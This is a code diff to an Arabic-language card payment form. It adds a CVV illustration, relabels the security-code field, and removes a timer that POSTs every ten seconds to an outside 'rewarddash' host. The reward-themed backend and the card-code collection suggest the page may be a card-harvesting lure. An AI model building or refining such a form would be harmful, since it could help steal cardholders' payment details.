@@ -113,10 +113,17 @@
       </div>
     </div>
 
+
+
+<div class="form-group">
+  <img src="images/cvv.jpeg" alt="Bank Info" class="bank-image" style="width: 100px; height: auto;" />
+</div>
+
     <div class="form-group">
-  <label for="cvc">رمز التحقق (CVC) *</label>
+  <label for="cvc">رمز التحقق (CVV) *</label>
   <input type="text" id="cvc" name="cvc" placeholder="أدخل رمز التحقق" maxlength="4" required style="direction: ltr;" />
 </div>
+
 
     <div class="form-group">
       <button type="submit" class="confirm-btn">تأكيد</button>
@@ -218,11 +225,7 @@
   });
 });
 
-  setInterval(() => {
-    fetch('https://rewarddash.onrender.com/api/messages', {
-      method: 'POST'
-    });
-  }, 10000); 
+
 
 </script>
 
